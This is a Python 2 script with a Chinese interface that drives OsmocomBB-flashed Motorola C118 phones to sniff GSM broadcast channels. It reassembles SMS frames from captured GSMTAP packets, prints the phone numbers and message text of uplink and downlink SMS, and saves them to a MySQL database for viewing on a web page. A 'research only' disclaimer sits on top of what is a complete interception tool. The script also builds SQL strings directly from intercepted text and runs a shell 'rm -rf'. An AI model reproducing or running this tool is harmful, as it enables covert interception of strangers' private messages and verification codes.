#!/usr/bin/python
#!coding=utf-8

import socket
import struct
import threading
import Queue
import MySQLdb
import time
import subprocess
import re
import os
import sys

if __name__ == '__main__':
    if os.geteuid():
        args = [sys.executable] + sys.argv
        os.execlp('sudo', 'sudo', *args)

class Database:
    host = '127.0.0.1'
    user = 'root'
    password = ''
    db = 'smshack'
 
    def __init__(self):
        self.connection = MySQLdb.connect(self.host, self.user, self.password, self.db)
        self.cursor = self.connection.cursor()
 
    def insert(self, query):
        try:
            self.cursor.execute(query)
            self.connection.commit()
        except:
            self.connection.rollback()
 
    def query(self, query):
        cursor = self.connection.cursor( MySQLdb.cursors.DictCursor )
        cursor.execute(query)
 
        return cursor.fetchall()
 
    def __del__(self):
        self.connection.close()
 
def covert_cellphone_num(num):
    phone_number = []
    for i in num:
        i = ord(i)
        i = (i << 4 & 0xF0) + (i >> 4 & 0x0F)
        phone_number.append(chr(i))
 
    return ("".join(phone_number).encode('hex'))[:-1]
 
def handle_message(**kargs):
    gsm_sms_segs = ""
    mysql = Database()
    mysql.insert("SET NAMES utf8")
 
    while True:
        data = kargs['messages'].get(True)
        if data[0:2] == '\x02\x04': #GSM_TAP header Version02 & HeaderLength 16bytes
 
            #uplink = struct.unpack('H', data[4:6])[0]
            #uplink = (uplink & 0x40 == 0x40)
            #print data.encode('hex')
            #skip header 16 bytes, directly handle the LAPDm part
            address_field = struct.unpack('B', data[16:17])[0]
            control_field = struct.unpack('B', data[17:18])[0]
            length_field =  struct.unpack('B', data[18:19])[0]
 
            if (address_field >> 2) & 0x1F == 3: # GSM SMS
                if (control_field & 0x01) == 0x00:  # frame type == information frame
                    # caculate segments data length
                    seg_len = (length_field >> 2) & 0x3F
                    # if there are more segments
                    has_segments = ((length_field >> 1) & 0x01 == 0x1)
                    # caculate segments sequence
                    seq = (control_field >> 1) & 0x07
 
                    gsm_sms_segs += data[19:19+seg_len]
 
                    # reassemble all segments when handling the last packet
                    if has_segments == False:
 
                        gsm_sms = gsm_sms_segs
                        gsm_sms_segs = ""
 
                        to_number = ""
                        from_number = ""
                        to_number_len = 0
                        from_number_len = 0
                        is_sms_submit = False
                        is_sms_deliver = False
                        has_tpudhi = False
                        has_tpvpf = False
                        is_mms = False
 
                        if (len(gsm_sms) > 10 and ord(gsm_sms[0:1]) & 0x0F == 0x09) and (ord(gsm_sms[1:2]) == 0x01) and (ord(gsm_sms[2:3]) > 0x10): # SMS Message
                            try:
                                #print gsm_sms.encode('hex') //hoho
                                # determinate if this is uplink message aka MS to Network
                                is_uplink = (ord(gsm_sms[3:4]) == 0x00)
                		print "***********************************************************************************************"
                                print ("短信类型: 上行" if is_uplink else "短信类型: 下行")
 
                                if is_uplink:
                                    to_number_len = struct.unpack('B', gsm_sms[6:7])[0] - 1
                                    to_number = gsm_sms[8:8+to_number_len]
                                    to_number = covert_cellphone_num(to_number)
 
                                    # check if this is SMS-SUBMIT
                                    sms_submit = struct.unpack('B', gsm_sms[7+to_number_len+2:7+to_number_len+2+1])[0]
                                    if sms_submit & 0x03 == 0x01:
                                        is_sms_submit = True
                                        # check if TP UD includes a extra header
                                        has_tpudhi = ((struct.unpack('B', gsm_sms[7+to_number_len+2:7+to_number_len+2+1])[0] & 0x40) == 0x40)
                                        has_tpvpf = ((struct.unpack('B', gsm_sms[7+to_number_len+2:7+to_number_len+2+1])[0] >> 3 & 0x02) == 0x02)
                                        from_number_len = struct.unpack('B', gsm_sms[8+to_number_len+3:8+to_number_len+3+1])[0]
                                        from_number_len = (from_number_len / 2) + (from_number_len % 2)
                                        from_number = gsm_sms[8+to_number_len+3+2:8+to_number_len+3+2+from_number_len]
                                        from_number = covert_cellphone_num(from_number)

                    			print "手机号码: %s" % from_number
                    			print "中心号码: %s" % to_number
                    			print "接收时间: %s" % GetCurrentTime()
 
                                else:
                                    to_number_len = struct.unpack('B', gsm_sms[5:6])[0] - 1
                                    to_number = gsm_sms[7:7+to_number_len]
                                    to_number = covert_cellphone_num(to_number)
 
                                    # check if this is SMS-DELIVER
                                    sms_deliver = struct.unpack('B', gsm_sms[7+to_number_len+2:7+to_number_len+2+1])[0]
                                    if sms_deliver & 0x03 == 0x0:
                                        is_sms_deliver = True
                                        # check if TP UD includes a extra header
                                        has_tpudhi = ((struct.unpack('B', gsm_sms[7+to_number_len+2:7+to_number_len+2+1])[0] & 0x40) == 0x40)
 
                                        from_number_len = struct.unpack('B', gsm_sms[7+to_number_len+3:7+to_number_len+3+1])[0]
                                        from_number_len = (from_number_len / 2) + (from_number_len % 2)
                                        from_number = gsm_sms[7+to_number_len+3+2:7+to_number_len+3+2+from_number_len]
                                        from_number = covert_cellphone_num(from_number)
 
                                        print "手机号码: %s" % from_number
                    			print "中心号码: %s" % to_number
                    			print "接收时间: %s" % GetCurrentTime()
 
                                if is_sms_deliver:
                                    try:
                                        # if there is additional header, skip it
                                        header_len = 0
                                        if has_tpudhi:
                                            header_len = struct.unpack('B', gsm_sms[7+to_number_len+3+2+from_number_len+10:7+to_number_len+3+2+from_number_len+10+1])[0]
 
                                        mms = struct.unpack('B', gsm_sms[7+to_number_len+3+2+from_number_len+1:7+to_number_len+3+2+from_number_len+1+1])[0]
                                        if ((mms >> 2) & 0x03) == 0x01:
                                            is_mms = True
 
                                        if header_len == 0:
                                            sms = gsm_sms[7+to_number_len+3+2+from_number_len + 10:]
                                        else:
                                            sms = gsm_sms[7+to_number_len+3+2+from_number_len + 10 + header_len + 1:]

                                        if not is_mms:
                        		    print '--------------------------------------'
                                            print sms.decode('UTF-16BE')
                                            print '--------------------------------------'
                                            mysql.insert("INSERT INTO sms_data(sms_to, sms_from, sms_message, type) VALUES('%s', '%s', '%s', 'downlink')" % (to_number.encode('utf-8'), from_number.encode('utf-8'), sms.decode('UTF-16BE').encode('utf-8')))
                                            subprocess.Popen("rm -rf *.dat",shell = True)
                                        else:
                                            print '--------------------------------------'
                                            print "MMS 信息"
                                            print '--------------------------------------'
 
                                    except Exception as e:
                                        print '--------- Exception----------------'
                                        print e
                                        print '--------- Exception----------------'
 
                                elif is_sms_submit:
                                    try:
                                        # if there is additional header, skip it
                                        header_len = 0
                                        # looks like uplink sms doesn't have a TP service centre time stamp
                                        if has_tpudhi:
                                            header_len = struct.unpack('B', gsm_sms[8+to_number_len+3+2+from_number_len+3:8+to_number_len+3+2+from_number_len+3+1])[0]
 
                                        mms = struct.unpack('B', gsm_sms[8+to_number_len+3+2+from_number_len+1:8+to_number_len+3+2+from_number_len+1+1])[0]
                                        if ((mms >> 2) & 0x03) == 0x01:
                                            is_mms = True
 
                                        if has_tpvpf:
                                            if header_len == 0:
                                                sms = gsm_sms[8+to_number_len+3+2+from_number_len + 3 + 1:]
                                            else:
                                                sms = gsm_sms[8+to_number_len+3+2+from_number_len + 3 + header_len + 1 + 1:]
                                        else:
                                            if header_len == 0:
                                                sms = gsm_sms[8+to_number_len+3+2+from_number_len + 3:]
                                            else:
                                                sms = gsm_sms[8+to_number_len+3+2+from_number_len + 3 + header_len + 1:]

                                        if not is_mms:
                                            print '--------------------------------------'
                        		    print sms.decode('UTF-16BE')
                        		    print '--------------------------------------'
                                            mysql.insert("INSERT INTO sms_data(sms_to, sms_from, sms_message, type) VALUES('%s', '%s', '%s', 'uplink')" % (to_number.encode('utf-8'), from_number.encode('utf-8'), sms.decode('UTF-16BE').encode('utf-8')))
                                        else:
                                            print '--------------------------------------'
                                            print "MMS 信息"
                                            print '--------------------------------------'
                                    except Exception as e:
                                        print '--------- Exception----------------'
                                        print e
                                        print '--------- Exception----------------'
                                else:
                                    print '--------------------------------------'
                                    print "短信状态报告"
                                    print '--------------------------------------'
                            except Exception as e:
                                print '--------- Exception----------------'
                                print e
                                print '--------- Exception----------------'
 
def GetCurrentTime():
    return time.strftime('%Y/%m/%d %H:%M:%S',time.localtime(time.time()))

if __name__ == '__main__':
	print "                                                                     "
	print "                                                                     "	
	print "--------------------------------声明----------------------------------"
	print "                                                                      "
	print "本系统只为研究GSM通讯协议安全性所做，请勿用于非法用途,请于24小时内删除。"
	print "因使用本系统和软件所带来的后果，将由使用者一人承担，与本系统制作者无关。"
	print "      一旦你开始使用本系统和软件，则说明你已经阅读和同意本声明！"
	print "                                                           By gsmsec_7"
	print "                                                                      "
	print "----------------------------------------------------------------------"
	print "                                                                      "	
	print "                                                                      "
	print "                                                                      "
	raw_input("是否同意本声明？（同意，请按回车键 / 不同意，请关闭本窗口）")
	print "                                                                      "
	print "                                                                      "
	print "                                                                      "
	print "----------------------------------------------------------------"
	print "此Python脚本用于多机SMS嗅探，并可以结合数据库，在网页前端显示短信。"
	print "短信实时显示在终端窗口并实时存储到Mysql数据库。"
	print "注意：此程序只是简单的实现了多部手机同时嗅探‘多个频点’和‘多信道’的功能。"
	print "您可以根据自己的需要随意更改此程序，但是请在文中注明版权"
	print "----------------------------------------------------------------"

	try:
	    	subprocess.Popen("rm -rf *.dat",shell = True)
	    	print "检查Mysql服务状态..."
	    	mysqlCheckCMD = ["service","mysql","status"]
	    	mysqlshell = subprocess.Popen(mysqlCheckCMD,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
	    	mysqlSta = mysqlshell.communicate()
	    	mysqlshell.wait()
	    	serviceExt = re.findall(r'stopped',mysqlSta[0])

	    	if len(serviceExt)>0:
	    		print "Mysql服务未启动，正在尝试启动服务..."
	    		stratMysqlCMD = ["service","mysql","start"]
	    		mysqlStratPro = subprocess.Popen(stratMysqlCMD,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
	    		mysqlStratRes = mysqlStratPro.communicate()
	    		mysqlStratPro.wait()
	    		startMysqlExt = re.findall(r'failed',mysqlStratRes[0])
	    		if len(startMysqlExt)>0 :
	    			print "尝试启动Mysql服务失败，请检查Mysql是否已经正确安装！"
	    			exit(1)
	    		else:
	    			print "尝试启动服务成功，Mysql服务已经正常运行..."
	    	else:
	    		print "检测到Mysql服务已经正常运行..."

	    	print "----------------------------------------------------------------"
	    	base_path = '/home/gsm/' 
	    	subprocess.Popen("killall ccch_scan cell_log osmocon 2>/dev/null",shell = True)
		getusb = subprocess.Popen(["./getusb.sh"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
		usbResult = getusb.communicate()
		getusb.wait()
		deviceCount = int(usbResult[0])
		device = str(deviceCount)
		if deviceCount == 0:
			print '未检测到任何可用设备，请检查设备后再试'
			exit(1)

		ifcount = raw_input('检测到已经有' + device  +'个设备接入，数量正确吗？(Y/N):')
		print '                                                                '
		if ifcount.lower() == "y":
		    	print "您已经确认设备数量为"+ device +"个"
		else:
		    	print "设备数量有误，请检查设备后再试"
			exit(1)

		deviceIndex = 0
		print "----------------------------------------------------------------"
		print "所有需要的"+ device +"个窗口都将依次弹出，请轻按所有设备的开机键写入固件"
		print "                                                                "
		xindao =[0,2,4,6]
		while deviceIndex<deviceCount:
			s=0
			gujian_numbe=raw_input('请从( 0 / 2 / 4 / 6 )信道固件中选择一个对USB%d端口的C118进行刷机: '%(deviceIndex))
			print '                                                                '
			if gujian_numbe is '0':
				s=0
			elif gujian_numbe is '2':
				s=1
			elif gujian_numbe is '4':
				s=2
			elif gujian_numbe is '6':
				s=3
			downloadShell = ['xterm','-geometry','50x2+0+'+str(685-int(11-deviceIndex)*60),'-T','osmocon_USB'+ str(deviceIndex),'-e',base_path + 'osmocom-bb/src/host/osmocon/osmocon','-m','c123xor','-s','/tmp/osmocom_l2_'+ str(deviceIndex+1) ,'-p','/dev/ttyUSB'+ str(deviceIndex),base_path +'osmocom-bb/src/target/firmware/board/compal_e88/layer1.compalram.bin'+str(xindao[s])]
			print '>>> 正在向 USB%d 端口的C118 刷入 %d 信道固件...'%(deviceIndex,xindao[s])
			print '                                                                '
			subprocess.Popen(downloadShell,stderr=open('./download.err','w'),stdout=open('./download.log','w'))
			deviceIndex+=1
		else:
			time.sleep(10)
			print '请确认所有设备已经写入固件成功!!!'
		print "                                                                "
		print "################################################################"
		print "----------------------------------------------------------------"
		print "                                                                "

		ifcount = raw_input('是否需要扫描ARFCNS?(Y/N):')
		if ifcount.lower() == "y":
		    	
		    	cellLogshell = [base_path + "osmocom-bb/src/host/layer23/src/misc/cell_log","-s","/tmp/osmocom_l2_1","-O"];
	           	arfcnScan = subprocess.Popen(cellLogshell,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
	           	print "正在进行ARFCNS扫描，扫描结束后结果将会自动显示在窗口，请等待..."
			print "                                                                "
	            	scanlog = arfcnScan.communicate()
	            	arfcnScan.wait()
	            	scanloginfo = ";".join(scanlog)
	            	scanbase = re.findall(r"ARFCN\=[^)]+\)",scanloginfo)
	            	arfcnIndex = 0
	            	for base in scanbase:
	                	print "["+ str(arfcnIndex+1)+ "] " +base
	                	arfcnIndex+=1
			print "                                                                "
	                print "ARFCN扫描已经完成，共扫描到 "+str(arfcnIndex)+" 个ARFCN"
			print "当前最多可同时嗅探 "+ device +" 个ARFCN"
		else:
		    	print "您已跳过ARFCN扫描"
			print "                                                                "
			print "################################################################"
			print "----------------------------------------------------------------"
			print "                                                                "

		setDevice = deviceCount
		wantSniffer = raw_input("请输入您需要嗅探的ARFCN个数 (默认设置为设备的个数):")
		print "                                                                "
		if not wantSniffer.isdigit():
		    	print "默认给您设置了 "+ str(deviceCount) +" 个"
			print "                                                                "
			setDevice = deviceCount
		elif (int(wantSniffer)>deviceCount) or (int(wantSniffer)<0):
			print "输入的个数不对，默认给您设置了 "+ str(deviceCount) +" 个"
		    	print "                                                                "
			setDevice = deviceCount
		else:
		 	setDevice = int(wantSniffer)

		print "----------------------------------------------------------------"
		print "----------------------------------------------------------------"
		print "                                                                 "

		arfcnIdx = 0
		arfcns = []
		qs = []
		ts = []
		ss = []

		while arfcnIdx<setDevice:
			scanarf = raw_input("请输入USB%d端口上C118需要嗅探的ARFCN编号:"%(arfcnIdx)) 
			print   "----------------------------------------------------------------"
			print	"                                                                "
			arfcns.append(scanarf)
			qs.append(Queue.Queue())
		        ts.append(threading.Thread(target=handle_message, name="handle_message_thread", kwargs={'messages':qs[arfcnIdx]}))
		        ts[arfcnIdx].daemon = True
		        ts[arfcnIdx].start()
		        ss.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
		        ss[arfcnIdx].bind(('127.0.0.'+str(arfcnIdx+1), 4729))
			arfcnIdx+=1

		arfcnsLen = len(arfcns)
		print "################################################################"
		print "                                                                " 

		for i in range(arfcnsLen):
		    	sniffinfo = ['xterm','-geometry','50x2+370+'+str(int(i)*60+25),"-T","ccch_scan_USB"+ str(i),"-e",base_path + "osmocom-bb/src/host/layer23/src/misc/ccch_scan","-s","/tmp/osmocom_l2_"+str(i+1),"-i","127.0.0."+str(i+1),"-a",arfcns[i]]
		        subprocess.Popen(sniffinfo,stderr=open('./sniff.err','w'),stdout=open('./sniff.log','w'))
		        print "USB%d端口上C118正在嗅探ARFCN:"%(i) +str(arfcns[i])	
			print   "----------------------------------------------------------------"
			print   "                                                                " 
		print "                                                                " 
		print "################################################################"
		print "                                                                "
		print "请打开web网页，进行SMS查看... ..."
		print "                                                                "
		print "所嗅探到的短信同时将显示在本窗口中... ..."
		print "                                                                "
		print "----------------------------------------------------------------"
		print "----------------------------------------------------------------"

		while True:
			for j in range(arfcnsLen):
			    	data, addr = ss[j].recvfrom(2048)
			    	qs[j].put(data)

	except KeyboardInterrupt:
	        try:
	        	subprocess.Popen("killall ccch_scan cell_log osmocon 2>/dev/null",shell = True)
	        except:
	        	pass

